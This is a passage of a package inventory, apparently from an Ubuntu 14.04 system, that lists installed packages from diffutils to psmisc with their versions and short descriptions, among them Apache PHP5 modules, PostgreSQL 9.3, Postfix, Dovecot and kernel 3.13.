    diffutils 1:3.3-1  File comparison utilities
    dmidecode 2.12-2  SMBIOS/DMI table decoder
    dmsetup 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
    dnsutils 1:9.9.5.dfsg-3  Clients provided with BIND
    dosfstools 3.0.26-1  utilities for making and checking MS-DOS FAT filesystems
    dovecot-core 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - core files
    dovecot-pop3d 1:2.2.9-1ubuntu2.4  secure POP3/IMAP server - POP3 daemon
    dpkg 1.17.5ubuntu5.3  Debian package management system
    e2fslibs:amd64 1.42.9-3ubuntu1  ext2/ext3/ext4 file system libraries
    e2fsprogs 1.42.9-3ubuntu1  ext2/ext3/ext4 file system utilities
    ed 1.9-2  classic UNIX line editor
    eject 2.1.5+deb1+cvs20081104-13.1  ejects CDs and operates CD-Changers under Linux
    file 1:5.14-2ubuntu3.1  Determines file type using "magic" numbers
    findutils 4.4.2-7  utilities for finding files--find, xargs
    fontconfig 2.11.0-0ubuntu4.2  generic font configuration library - support binaries
    fontconfig-config 2.11.0-0ubuntu4.2  generic font configuration library - configuration
    fonts-dejavu-core 2.34-1ubuntu1  Vera font family derivate with additional characters
    friendly-recovery 0.2.25  Make recovery more user-friendly
    ftp 0.17-28  classical file transfer client
    fuse 2.9.2-4ubuntu4  Filesystem in Userspace
    gcc-4.8-base:amd64 4.8.4-2ubuntu1~14.04.4  GCC, the GNU Compiler Collection (base package)
    gcc-4.9-base:amd64 4.9-20140406-0ubuntu1  GCC, the GNU Compiler Collection (base package)
    geoip-database 20140313-1  IP lookup command line tools that use the GeoIP library (country database)
    gettext-base 0.18.3.1-1ubuntu3  GNU Internationalization utilities for the base system
    gir1.2-glib-2.0 1.40.0-1ubuntu0.1  Introspection data for GLib, GObject, Gio and GModule
    gnupg 1.4.16-1ubuntu2.1  GNU privacy guard - a free PGP replacement
    gpgv 1.4.16-1ubuntu2.1  GNU privacy guard - signature verification tool
    grep 2.16-1  GNU grep, egrep and fgrep
    groff-base 1.22.2-5  GNU troff text-formatting system (base system components)
    grub-common 2.02~beta2-9ubuntu1.14  GRand Unified Bootloader (common files)
    grub-gfxpayload-lists 0.6  GRUB gfxpayload blacklist
    grub-pc 2.02~beta2-9ubuntu1.14  GRand Unified Bootloader, version 2 (PC/BIOS version)
    grub-pc-bin 2.02~beta2-9ubuntu1.14  GRand Unified Bootloader, version 2 (PC/BIOS binaries)
    grub2-common 2.02~beta2-9ubuntu1.14  GRand Unified Bootloader (common files for version 2)
    gzip 1.6-3ubuntu1  GNU compression utilities
    hdparm 9.43-1ubuntu3  tune hard disk parameters for high performance
    hostname 3.15ubuntu1  utility to set/show the host name or domain name
    ifupdown 0.7.47.2ubuntu4.1  high level tools to configure network interfaces
    info 5.2.0.dfsg.1-2  Standalone GNU Info documentation browser
    init-system-helpers 1.14  helper tools for all init systems
    initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
    initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
    initscripts 2.88dsf-41ubuntu6  scripts for initializing and shutting down the system
    insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
    install-info 5.2.0.dfsg.1-2  Manage installed documentation in info format
    installation-report 2.54ubuntu1  system installation report
    iproute2 3.12.0-2  networking and traffic control tools
    iptables 1.4.21-1ubuntu1  administration tools for packet filtering and NAT
    iputils-ping 3:20121221-4ubuntu1.1  Tools to test the reachability of network hosts
    iputils-tracepath 3:20121221-4ubuntu1.1  Tools to trace the network path to a remote host
    irqbalance 1.0.6-2  Daemon to balance interrupts for SMP systems
    isc-dhcp-client 4.2.4-7ubuntu12  ISC DHCP client
    isc-dhcp-common 4.2.4-7ubuntu12  common files used by all the isc-dhcp* packages
    iso-codes 3.52-1  ISO language, territory, currency, script codes and their translations
    kbd 1.15.5-1ubuntu1  Linux console font and keytable utilities
    keyboard-configuration 1.70ubuntu8  system-wide keyboard preferences
    klibc-utils 2.0.3-0ubuntu1  small utilities built with klibc for early boot
    kmod 15-0ubuntu6  tools for managing Linux kernel modules
    krb5-locales 1.12+dfsg-2ubuntu4  Internationalization support for MIT Kerberos
    language-pack-en 1:14.04+20160720  translation updates for language English
    language-pack-en-base 1:14.04+20160720  translations for language English
    language-pack-gnome-en 1:14.04+20160720  GNOME translation updates for language English
    language-pack-gnome-en-base 1:14.04+20160720  GNOME translations for language English
    language-selector-common 0.129.2  Language selector for Ubuntu
    laptop-detect 0.13.7ubuntu2  attempt to detect a laptop
    less 458-2  pager program similar to more
    libaccountsservice0:amd64 0.6.35-0ubuntu7  query and manipulate user account information - shared libraries
    libacl1:amd64 2.2.52-1  Access control list shared library
    libapache2-mod-php5 5.5.9+dfsg-1ubuntu4.24  server-side, HTML-embedded scripting language (Apache 2 module)
    libapparmor-perl 2.8.95~2430-0ubuntu5  AppArmor library Perl bindings
    libapparmor1:amd64 2.8.95~2430-0ubuntu5  changehat AppArmor library
    libapr1:amd64 1.5.0-1  Apache Portable Runtime Library
    libaprutil1:amd64 1.5.3-1  Apache Portable Runtime Utility Library
    libaprutil1-dbd-sqlite3:amd64 1.5.3-1  Apache Portable Runtime Utility Library - SQLite3 Driver
    libaprutil1-ldap:amd64 1.5.3-1  Apache Portable Runtime Utility Library - LDAP Driver
    libapt-inst1.5:amd64 1.0.1ubuntu2.1  deb package format runtime library
    libapt-pkg4.12:amd64 1.0.1ubuntu2.1  package management runtime library
    libarchive-extract-perl 0.70-1  generic archive extracting module
    libasan0:amd64 4.8.4-2ubuntu1~14.04.4  AddressSanitizer -- a fast memory error detector
    libasn1-8-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - ASN.1 library
    libasprintf0c2:amd64 0.18.3.1-1ubuntu3  GNU library to use fprintf and friends in C++
    libatk1.0-0:amd64 2.10.0-2ubuntu2  ATK accessibility toolkit
    libatk1.0-data 2.10.0-2ubuntu2  Common files for the ATK accessibility toolkit
    libatkmm-1.6-1:amd64 2.22.7-2ubuntu1  C++ wrappers for ATK accessibility toolkit (shared libraries)
    libatomic1:amd64 4.8.4-2ubuntu1~14.04.4  support library providing __atomic built-in functions
    libattr1:amd64 1:2.4.47-1ubuntu1  Extended attribute shared library
    libaudit-common 1:2.3.2-2ubuntu1  Dynamic library for security auditing - common files
    libaudit1:amd64 1:2.3.2-2ubuntu1  Dynamic library for security auditing
    libavahi-client3:amd64 0.6.31-4ubuntu1.2  Avahi client library
    libavahi-common-data:amd64 0.6.31-4ubuntu1.2  Avahi common data files
    libavahi-common3:amd64 0.6.31-4ubuntu1.2  Avahi common library
    libbind9-90 1:9.9.5.dfsg-3  BIND9 Shared Library used by BIND
    libblkid1:amd64 2.20.1-5.1ubuntu20.1  block device id library
    libboost-iostreams1.54.0:amd64 1.54.0-4ubuntu3.1  Boost.Iostreams Library
    libbsd0:amd64 0.6.0-2ubuntu1  utility functions from BSD systems - shared library
    libbz2-1.0:amd64 1.0.6-5  high-quality block-sorting file compressor library - runtime
    libc-bin 2.19-0ubuntu6  Embedded GNU C Library: Binaries
    libc-dev-bin 2.19-0ubuntu6.14  Embedded GNU C Library: Development binaries
    libc6:amd64 2.19-0ubuntu6.14  Embedded GNU C Library: Shared libraries
    libc6-dev:amd64 2.19-0ubuntu6.14  Embedded GNU C Library: Development Libraries and Header Files
    libcairo2:amd64 1.13.0~20140204-0ubuntu1.1  The Cairo 2D vector graphics library
    libcairomm-1.0-1:amd64 1.10.0-1ubuntu3  C++ wrappers for Cairo (shared libraries)
    libcap-ng0 0.7.3-1ubuntu2  An alternate POSIX capabilities library
    libcap2:amd64 1:2.24-0ubuntu2  support for getting/setting POSIX.1e capabilities
    libcap2-bin 1:2.24-0ubuntu2  basic utility programs for using capabilities
    libcgmanager0:amd64 0.24-0ubuntu7  Central cgroup manager daemon (client library)
    libclang-common-3.4-dev 1:3.4-1ubuntu3  clang library - Common development package
    libclang1-3.4:amd64 1:3.4-1ubuntu3  C interface to the clang library
    libclass-accessor-perl 0.34-1  Perl module that automatically generates accessors
    libcloog-isl4:amd64 0.18.2-1  Chunky Loop Generator (runtime library)
    libcomerr2:amd64 1.42.9-3ubuntu1  common error description library
    libcups2:amd64 1.7.2-0ubuntu1.9  Common UNIX Printing System(tm) - Core library
    libcurl3:amd64 7.35.0-1ubuntu2.15  easy-to-use client-side URL transfer library (OpenSSL flavour)
    libcurl3-gnutls:amd64 7.35.0-1ubuntu2  easy-to-use client-side URL transfer library (GnuTLS flavour)
    libcwidget3 0.5.16-3.5ubuntu1  high-level terminal interface library for C++ (runtime files)
    libdatrie1:amd64 0.2.8-1  Double-array trie library
    libdb5.3:amd64 5.3.28-3ubuntu3  Berkeley v5.3 Database Libraries [runtime]
    libdbus-1-3:amd64 1.6.18-0ubuntu4.1  simple interprocess messaging system (library)
    libdbus-glib-1-2:amd64 0.100.2-1  simple interprocess messaging system (GLib-based shared library)
    libdebconfclient0:amd64 0.187ubuntu1  Debian Configuration Management System (C-implementation library)
    libdevmapper1.02.1:amd64 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
    libdns100 1:9.9.5.dfsg-3  DNS Shared Library used by BIND
    libdrm2:amd64 2.4.52-1  Userspace interface to kernel DRM services -- runtime
    libdumbnet1 1.12-4build1  A dumb, portable networking library -- shared library
    libedit2:amd64 3.1-20130712-2  BSD editline and history libraries
    libelf1:amd64 0.158-0ubuntu5.1  library to read and write ELF files
    libept1.4.12:amd64 1.0.12  High-level library for managing Debian package information
    libestr0 0.1.9-0ubuntu2  Helper functions for handling strings (lib)
    libexpat1:amd64 2.1.0-4ubuntu1  XML parsing C library - runtime library
    libffi-dev:amd64 3.1~rc1+r3.0.13-12ubuntu0.2  Foreign Function Interface library (development files)
    libffi6:amd64 3.1~rc1+r3.0.13-12ubuntu0.2  Foreign Function Interface library runtime
    libfontconfig1:amd64 2.11.0-0ubuntu4.2  generic font configuration library - runtime
    libfreetype6:amd64 2.5.2-1ubuntu2.8  FreeType 2 font engine, shared library files
    libfribidi0:amd64 0.19.6-1  Free Implementation of the Unicode BiDi algorithm
    libfuse2:amd64 2.9.2-4ubuntu4  Filesystem in Userspace (library)
    libgcc-4.8-dev:amd64 4.8.4-2ubuntu1~14.04.4  GCC support library (development files)
    libgcc1:amd64 1:4.9-20140406-0ubuntu1  GCC support library
    libgck-1-0:amd64 3.10.1-1  Glib wrapper library for PKCS#11 - runtime
    libgcr-3-common 3.10.1-1  Library for Crypto UI related tasks - common files
    libgcr-base-3-1:amd64 3.10.1-1  Library for Crypto related tasks
    libgcrypt11:amd64 1.5.3-2ubuntu4  LGPL Crypto library - runtime library
    libgdbm3:amd64 1.8.3-12build1  GNU dbm database routines (runtime version)
    libgdk-pixbuf2.0-0:amd64 2.30.7-0ubuntu1.8  GDK Pixbuf library
    libgdk-pixbuf2.0-common 2.30.7-0ubuntu1.8  GDK Pixbuf library - data files
    libgeoip1:amd64 1.6.0-1  non-DNS IP-to-country resolver library
    libgirepository-1.0-1 1.40.0-1ubuntu0.1  Library for handling GObject introspection data (runtime library)
    libglib2.0-0:amd64 2.40.0-2  GLib library of C routines
    libglib2.0-data 2.40.0-2  Common files for GLib library
    libglibmm-2.4-1c2a:amd64 2.39.93-0ubuntu1  C++ wrapper for the GLib toolkit (shared libraries)
    libgmp10:amd64 2:5.1.3+dfsg-1ubuntu1  Multiprecision arithmetic library
    libgnutls-openssl27:amd64 2.12.23-12ubuntu2.1  GNU TLS library - OpenSSL wrapper
    libgnutls26:amd64 2.12.23-12ubuntu2.1  GNU TLS library - runtime library
    libgomp1:amd64 4.8.4-2ubuntu1~14.04.4  GCC OpenMP (GOMP) support library
    libgpg-error0:amd64 1.12-0.2ubuntu1  library for common error values and messages in GnuPG components
    libgpm2:amd64 1.20.4-6.1  General Purpose Mouse - shared library
    libgraphite2-3:amd64 1.3.10-0ubuntu0.14.04.1  Font rendering engine for Complex Scripts -- library
    libgssapi-krb5-2:amd64 1.12+dfsg-2ubuntu4  MIT Kerberos runtime libraries - krb5 GSS-API Mechanism
    libgssapi3-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - GSSAPI support library
    libgtk2.0-0:amd64 2.24.23-0ubuntu1.4  GTK+ graphical user interface library
    libgtk2.0-common 2.24.23-0ubuntu1.4  common files for the GTK+ graphical user interface library
    libgtkmm-2.4-1c2a:amd64 1:2.24.4-1ubuntu1  C++ wrappers for GTK+ (shared libraries)
    libharfbuzz0b:amd64 0.9.27-1ubuntu1.1  OpenType text shaping engine (shared library)
    libhcrypto4-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - crypto library
    libheimbase1-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - Base library
    libheimntlm0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - NTLM support library
    libhx509-5-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - X509 support library
    libice6:amd64 2:1.0.8-2  X11 Inter-Client Exchange library
    libicu52:amd64 52.1-3ubuntu0.8  International Components for Unicode
    libidn11:amd64 1.28-1ubuntu2  GNU Libidn library, implementation of IETF IDN specifications
    libio-string-perl 1.08-3  Emulate IO::File interface for in-core strings
    libisc95 1:9.9.5.dfsg-3  ISC Shared Library used by BIND
    libisccc90 1:9.9.5.dfsg-3  Command Channel Library used by BIND
    libisccfg90 1:9.9.5.dfsg-3  Config File Handling Library used by BIND
    libisl10:amd64 0.12.2-1  manipulating sets and relations of integer points bounded by linear constraints
    libitm1:amd64 4.8.4-2ubuntu1~14.04.4  GNU Transactional Memory Library
    libjasper1:amd64 1.900.1-14ubuntu3.4  JasPer JPEG-2000 runtime library
    libjbig0:amd64 2.0-2ubuntu4.1  JBIGkit libraries
    libjpeg-turbo8:amd64 1.3.0-0ubuntu2  IJG JPEG compliant runtime library.
    libjpeg8:amd64 8c-2ubuntu8  Independent JPEG Group's JPEG runtime library (dependency package)
    libjson-c2:amd64 0.11-3ubuntu1.2  JSON manipulation library - shared library
    libjson0:amd64 0.11-3ubuntu1.2  JSON manipulation library (transitional package)
    libk5crypto3:amd64 1.12+dfsg-2ubuntu4  MIT Kerberos runtime libraries - Crypto Library
    libkeyutils1:amd64 1.5.6-1  Linux Key Management Utilities (library)
    libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
    libkmod2:amd64 15-0ubuntu6  libkmod shared library
    libkrb5-26-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - libraries
    libkrb5-3:amd64 1.12+dfsg-2ubuntu4  MIT Kerberos runtime libraries
    libkrb5support0:amd64 1.12+dfsg-2ubuntu4  MIT Kerberos runtime libraries - Support library
    libldap-2.4-2:amd64 2.4.31-1+nmu2ubuntu8  OpenLDAP libraries
    libllvm3.4:amd64 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, runtime library
    liblocale-gettext-perl 1.05-7build3  module using libc functions for internationalization in Perl
    liblockfile-bin 1.09-6ubuntu1  support binaries for and cli utilities based on liblockfile
    liblockfile1:amd64 1.09-6ubuntu1  NFS-safe locking library
    liblog-message-simple-perl 0.10-1  simplified interface to Log::Message
    liblwres90 1:9.9.5.dfsg-3  Lightweight Resolver Library used by BIND
    liblzma5:amd64 5.1.1alpha+20120614-2ubuntu2  XZ-format compression library
    libmagic1:amd64 1:5.14-2ubuntu3.1  File type determination library using "magic" numbers
    libmcrypt4 2.5.8-3.1ubuntu1  De-/Encryption Library
    libmodule-pluggable-perl 5.1-1  module for giving modules the ability to have plugins
    libmount1:amd64 2.20.1-5.1ubuntu20.1  block device id library
    libmpdec2:amd64 2.4.0-6  library for decimal floating point arithmetic (runtime library)
    libncurses5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling
    libncursesw5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling (wide character support)
    libnewt0.52:amd64 0.52.15-2ubuntu5  Not Erik's Windowing Toolkit - text mode windowing with slang
    libnfnetlink0:amd64 1.0.1-2  Netfilter netlink library
    libnih-dbus1:amd64 1.0.3-4ubuntu25  NIH D-Bus Bindings Library
    libnih1:amd64 1.0.3-4ubuntu25  NIH Utility Library
    libnl-3-200:amd64 3.2.21-1  library for dealing with netlink sockets
    libnl-genl-3-200:amd64 3.2.21-1  library for dealing with netlink sockets - generic netlink
    libnuma1:amd64 2.0.9~rc5-1ubuntu2  Libraries for controlling NUMA policy
    libobjc-4.8-dev:amd64 4.8.4-2ubuntu1~14.04.4  Runtime library for GNU Objective-C applications (development files)
    libobjc4:amd64 4.8.4-2ubuntu1~14.04.4  Runtime library for GNU Objective-C applications
    libp11-kit0:amd64 0.20.2-2ubuntu2  Library for loading and coordinating access to PKCS#11 modules - runtime
    libpam-cap:amd64 1:2.24-0ubuntu2  PAM module for implementing capabilities
    libpam-modules:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM
    libpam-modules-bin 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM - helper binaries
    libpam-runtime 1.1.8-1ubuntu2  Runtime support for the PAM library
    libpam-systemd:amd64 204-5ubuntu20.3  system and service manager - PAM module
    libpam0g:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules library
    libpango-1.0-0:amd64 1.36.3-1ubuntu1.1  Layout and rendering of internationalized text
    libpangocairo-1.0-0:amd64 1.36.3-1ubuntu1.1  Layout and rendering of internationalized text
    libpangoft2-1.0-0:amd64 1.36.3-1ubuntu1.1  Layout and rendering of internationalized text
    libpangomm-1.4-1:amd64 2.34.0-1ubuntu1  C++ Wrapper for pango (shared libraries)
    libparse-debianchangelog-perl 1.2.0-1ubuntu1  parse Debian changelogs and output them in other formats
    libparted0debian1:amd64 2.3-19ubuntu1  disk partition manipulator - shared library
    libpcap0.8:amd64 1.5.3-2  system interface for user-level packet capture
    libpci3:amd64 1:3.2.1-1ubuntu5  Linux PCI Utilities (shared library)
    libpcre3:amd64 1:8.31-2ubuntu2  Perl 5 Compatible Regular Expression Library - runtime files
    libpipeline1:amd64 1.3.0-1  pipeline manipulation library
    libpixman-1-0:amd64 0.30.2-2ubuntu1.1  pixel-manipulation library for X and cairo
    libplymouth2:amd64 0.8.8-0ubuntu17  graphical boot animation and logger - shared libraries
    libpng12-0:amd64 1.2.50-1ubuntu2  PNG library - runtime
    libpod-latex-perl 0.61-1  module to convert Pod data to formatted LaTeX
    libpolkit-gobject-1-0:amd64 0.105-4ubuntu2  PolicyKit Authorization API
    libpopt0:amd64 1.16-8ubuntu1  lib for parsing cmdline parameters
    libpq5 9.3.22-0ubuntu0.14.04  PostgreSQL C client library
    libprocps3:amd64 1:3.3.9-1ubuntu2  library for accessing process information from /proc
    libpython-stdlib:amd64 2.7.5-5ubuntu3  interactive high-level object-oriented language (default python version)
    libpython2.7:amd64 2.7.6-8ubuntu0.4  Shared Python runtime library (version 2.7)
    libpython2.7-minimal:amd64 2.7.6-8ubuntu0.4  Minimal subset of the Python language (version 2.7)
    libpython2.7-stdlib:amd64 2.7.6-8ubuntu0.4  Interactive high-level object-oriented language (standard library, version 2.7)
    libpython3-stdlib:amd64 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
    libpython3.4-minimal:amd64 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
    libpython3.4-stdlib:amd64 3.4.0-2ubuntu1  Interactive high-level object-oriented language (standard library, version 3.4)
    libquadmath0:amd64 4.8.4-2ubuntu1~14.04.4  GCC Quad-Precision Math Library
    libreadline6:amd64 6.3-4ubuntu2  GNU readline and history libraries, run-time libraries
    libroken18-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - roken support library
    librtmp0:amd64 2.4+20121230.gitdf6c518-1  toolkit for RTMP streams (shared library)
    libsasl2-2:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - authentication abstraction library
    libsasl2-modules:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules
    libsasl2-modules-db:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules (DB)
    libselinux1:amd64 2.2.2-1ubuntu0.1  SELinux runtime shared libraries
    libsemanage-common 2.2-1  Common files for SELinux policy management libraries
    libsemanage1:amd64 2.2-1  SELinux policy management library
    libsepol1:amd64 2.2-1  SELinux library for manipulating binary security policies
    libsigc++-2.0-0c2a:amd64 2.2.10-0.2ubuntu2  type-safe Signal Framework for C++ - runtime
    libslang2:amd64 2.2.4-15ubuntu1  S-Lang programming library - runtime version
    libsm6:amd64 2:1.2.1-2  X11 Session Management library
    libsqlite3-0:amd64 3.8.2-1ubuntu2  SQLite 3 shared library
    libss2:amd64 1.42.9-3ubuntu1  command-line interface parsing library
    libssl1.0.0:amd64 1.0.1f-1ubuntu2.4  Secure Sockets Layer toolkit - shared libraries
    libstdc++-4.8-dev:amd64 4.8.4-2ubuntu1~14.04.4  GNU Standard C++ Library v3 (development files)
    libstdc++6:amd64 4.8.4-2ubuntu1~14.04.4  GNU Standard C++ Library v3
    libsub-name-perl 0.05-1build4  module for assigning a new name to referenced sub
    libsystemd-daemon0:amd64 204-5ubuntu20.3  systemd utility library
    libsystemd-login0:amd64 204-5ubuntu20.3  systemd login utility library
    libtasn1-6:amd64 3.4-3ubuntu0.1  Manage ASN.1 structures (runtime)
    libterm-ui-perl 0.42-1  Term::ReadLine UI made easy
    libtext-charwidth-perl 0.04-7build3  get display widths of characters on the terminal
    libtext-iconv-perl 1.7-5build2  converts between character sets in Perl
    libtext-soundex-perl 3.4-1build1  implementation of the soundex algorithm
    libtext-wrapi18n-perl 0.06-7  internationalized substitute of Text::Wrap
    libthai-data 0.1.20-3  Data files for Thai language support library
    libthai0:amd64 0.1.20-3  Thai language support library
    libtiff5:amd64 4.0.3-7ubuntu0.9  Tag Image File Format (TIFF) library
    libtimedate-perl 2.3000-1  collection of modules to manipulate date/time information
    libtinfo-dev:amd64 5.9+20140118-1ubuntu1  developer's library for the low-level terminfo library
    libtinfo5:amd64 5.9+20140118-1ubuntu1  shared low-level terminfo library for terminal handling
    libtsan0:amd64 4.8.4-2ubuntu1~14.04.4  ThreadSanitizer -- a Valgrind-based detector of data races (runtime)
    libudev1:amd64 204-5ubuntu20.3  libudev shared library
    libusb-0.1-4:amd64 2:0.1.12-23.3ubuntu1  userspace USB programming library
    libusb-1.0-0:amd64 2:1.0.17-1ubuntu2  userspace USB programming library
    libustr-1.0-1:amd64 1.0.4-3ubuntu2  Micro string library: shared library
    libuuid1:amd64 2.20.1-5.1ubuntu20.1  Universally Unique ID library
    libwind0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1  Heimdal Kerberos - stringprep implementation
    libwrap0:amd64 7.6.q-25  Wietse Venema's TCP wrappers library
    libx11-6:amd64 2:1.6.2-1ubuntu2  X11 client-side library
    libx11-data 2:1.6.2-1ubuntu2  X11 client-side library
    libxapian22 1.2.16-2ubuntu1  Search engine library
    libxau6:amd64 1:1.0.8-1  X11 authorisation library
    libxcb-render0:amd64 1.10-2ubuntu1  X C Binding, render extension
    libxcb-shm0:amd64 1.10-2ubuntu1  X C Binding, shm extension
    libxcb1:amd64 1.10-2ubuntu1  X C Binding
    libxcomposite1:amd64 1:0.4.4-1  X11 Composite extension library
    libxcursor1:amd64 1:1.1.14-1ubuntu0.14.04.1  X cursor management library
    libxdamage1:amd64 1:1.1.4-1ubuntu1  X11 damaged region extension library
    libxdmcp6:amd64 1:1.1.1-1  X11 Display Manager Control Protocol library
    libxext6:amd64 2:1.3.2-1  X11 miscellaneous extension library
    libxfixes3:amd64 1:5.0.1-1ubuntu1.1  X11 miscellaneous 'fixes' extension library
    libxi6:amd64 2:1.7.1.901-1ubuntu1.1  X11 Input extension library
    libxinerama1:amd64 2:1.1.3-1  X11 Xinerama extension library
    libxml2:amd64 2.9.1+dfsg1-3ubuntu4.3  GNOME XML library
    libxmuu1:amd64 2:1.1.1-1  X11 miscellaneous micro-utility library
    libxrandr2:amd64 2:1.5.0-1~trusty1  X11 RandR extension library
    libxrender1:amd64 1:0.9.8-1build0.14.04.1  X Rendering Extension client library
    libxtables10 1.4.21-1ubuntu1  netfilter xtables library
    libxtst6:amd64 2:1.2.2-1  X11 Testing -- Record extension library
    linux-firmware 1.127.5  Firmware for Linux kernel drivers
    linux-generic 3.13.0.32.38  Complete Generic Linux kernel and headers
    linux-headers-3.13.0-32 3.13.0-32.57  Header files related to Linux kernel version 3.13.0
    linux-headers-3.13.0-32-generic 3.13.0-32.57  Linux kernel headers for version 3.13.0 on 64 bit x86 SMP
    linux-headers-generic 3.13.0.32.38  Generic Linux kernel headers
    linux-image-3.13.0-32-generic 3.13.0-32.57  Linux kernel image for version 3.13.0 on 64 bit x86 SMP
    linux-image-extra-3.13.0-32-generic 3.13.0-32.57  Linux kernel extra modules for version 3.13.0 on 64 bit x86 SMP
    linux-image-generic 3.13.0.32.38  Generic Linux kernel image
    linux-libc-dev:amd64 3.13.0-145.194  Linux Kernel Headers for development
    llvm-3.4 1:3.4-1ubuntu3  Modular compiler and toolchain technologies
    llvm-3.4-dev 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, libraries and headers
    llvm-3.4-runtime 1:3.4-1ubuntu3  Modular compiler and toolchain technologies, IR interpreter
    locales 2.13+git20120306-12.1  common files for locale support
    lockfile-progs 0.1.17  Programs for locking and unlocking files and mailboxes
    login 1:4.1.5.1-1ubuntu9  system login tools
    logrotate 3.8.7-1ubuntu1  Log rotation utility
    lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
    lsb-release 4.1+Debian11ubuntu6  Linux Standard Base version reporting utility
    lshw 02.16-2ubuntu1  information about hardware configuration
    lsof 4.86+dfsg-1ubuntu2  Utility to list open files
    ltrace 0.7.3-4ubuntu5.1  Tracks runtime library calls in dynamically linked programs
    makedev 2.3.1-93ubuntu1  creates device files in /dev
    man-db 2.6.7.1-1  on-line manual pager
    manpages 3.54-1ubuntu1  Manual pages about using a GNU/Linux system
    manpages-dev 3.54-1ubuntu1  Manual pages about using GNU/Linux for development
    mawk 1.3.3-17ubuntu2  a pattern scanning and text processing language
    mime-support 3.54ubuntu1  MIME files 'mime.types' & 'mailcap', and support programs
    mlocate 0.26-1ubuntu1  quickly find files on the filesystem based on their name
    module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
    mount 2.20.1-5.1ubuntu20.1  Tools for mounting and manipulating filesystems
    mountall 2.53  filesystem mounting tool
    mtr-tiny 0.85-2  Full screen ncurses traceroute tool
    multiarch-support 2.19-0ubuntu6  Transitional package to ensure multiarch compatibility
    nano 2.2.6-1ubuntu1  small, friendly text editor inspired by Pico
    ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
    ncurses-bin 5.9+20140118-1ubuntu1  terminal-related programs and man pages
    net-tools 1.60-25ubuntu2  The NET-3 networking toolkit
    netbase 5.2  Basic TCP/IP networking system
    netcat-openbsd 1.105-7ubuntu1  TCP/IP swiss army knife
    ntfs-3g 1:2013.1.13AR.1-2ubuntu2  read/write NTFS driver for FUSE
    ntpdate 1:4.2.6.p5+dfsg-3ubuntu2  client for setting system time from NTP servers
    open-vm-tools 2:9.4.0-1280544-5ubuntu6.4  Open VMware Tools for virtual machines hosted on VMware (CLI)
    open-vm-tools-desktop 2:9.4.0-1280544-5ubuntu6.4  Open VMware Tools for virtual machines hosted on VMware (GUI)
    openssh-client 1:6.6p1-2ubuntu2  secure shell (SSH) client, for secure access to remote machines
    openssl 1.0.1f-1ubuntu2.4  Secure Sockets Layer toolkit - cryptographic utility
    os-prober 1.63ubuntu1.1  utility to detect other OSes on a set of drives
    parted 2.3-19ubuntu1  disk partition manipulator
    passwd 1:4.1.5.1-1ubuntu9  change and administer password and group data
    pciutils 1:3.2.1-1ubuntu5  Linux PCI Utilities
    perl 5.18.2-2ubuntu1  Larry Wall's Practical Extraction and Report Language
    perl-base 5.18.2-2ubuntu1  minimal Perl system
    perl-modules 5.18.2-2ubuntu1  Core Perl modules
    php5 5.5.9+dfsg-1ubuntu4.24  server-side, HTML-embedded scripting language (metapackage)
    php5-cli 5.5.9+dfsg-1ubuntu4.24  command-line interpreter for the php5 scripting language
    php5-common 5.5.9+dfsg-1ubuntu4.24  Common files for packages built from the php5 source
    php5-curl 5.5.9+dfsg-1ubuntu4.24  CURL module for php5
    php5-json 1.3.2-2build1  JSON module for php5
    php5-mcrypt 5.4.6-0ubuntu5  MCrypt module for php5
    php5-pgsql 5.5.9+dfsg-1ubuntu4.24  PostgreSQL module for php5
    php5-readline 5.5.9+dfsg-1ubuntu4.24  Readline module for php5
    plymouth 0.8.8-0ubuntu17  graphical boot animation and logger - main package
    plymouth-theme-ubuntu-text 0.8.8-0ubuntu17  graphical boot animation and logger - ubuntu-logo theme
    popularity-contest 1.57ubuntu1  Vote for your favourite packages automatically
    postfix 2.11.0-1ubuntu1.2  High-performance mail transport agent
    postgresql 9.3+154ubuntu1.1  object-relational SQL database (supported version)
    postgresql-9.3 9.3.22-0ubuntu0.14.04  object-relational SQL database, version 9.3 server
    postgresql-client-9.3 9.3.22-0ubuntu0.14.04  front-end programs for PostgreSQL 9.3
    postgresql-client-common 154ubuntu1.1  manager for multiple PostgreSQL client versions
    postgresql-common 154ubuntu1.1  PostgreSQL database-cluster manager
    powermgmt-base 1.31build1  Common utils and configs for power management
    ppp 2.4.5-5.1ubuntu2  Point-to-Point Protocol (PPP) - daemon
    pppconfig 2.3.19ubuntu1  A text menu based utility for configuring ppp
    pppoeconf 1.20ubuntu1  configures PPPoE/ADSL connections
    procps 1:3.3.9-1ubuntu2  /proc file system utilities
    psmisc 22.20-1ubuntu2  utilities that use the proc file system
